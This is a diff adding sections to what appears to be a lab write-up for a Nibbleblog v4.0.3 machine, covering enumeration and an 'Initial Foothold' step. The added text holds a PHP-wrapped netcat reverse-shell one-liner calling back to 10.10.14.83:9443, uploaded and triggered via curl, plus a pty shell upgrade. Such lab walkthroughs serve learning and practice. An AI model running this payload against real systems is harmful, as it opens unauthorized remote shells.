@@ -5,6 +5,7 @@
 * [Overview](#overview)
 * [Enumeration](#enumeration)
 * [Footprinting](#footprinting)
+* [Initial Foothold](#initialfoothold)
 
 ### Overview
 
@@ -72,6 +73,22 @@ By curling the `README` page, we identify: <br>
 ![readme](images/curl_target_readme.png)
 
 the version of `Nibbleblog: v4.0.3` <br>
+
+After revisiting the `Gobuster` output, I noticed that there are Status 301 codes in `/content` & `/plugins` <br>
+We visit the `/content` page to see if there's anything useful. <br>
+
+
+### Initial Foothold
+
+
+
+We will use the following `Bash` reverse shell and upload it. <br>
+`<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.83 9443 >/tmp/f");?>`
+
+
+Now, we `curl` the image page again to execute it. <br>
+We have a reverse shell! <br>
+We use `python3 -c 'import pty; pty.spawn("/bin/bash")'` to get us a more intuitive shell <br>
 
 
 
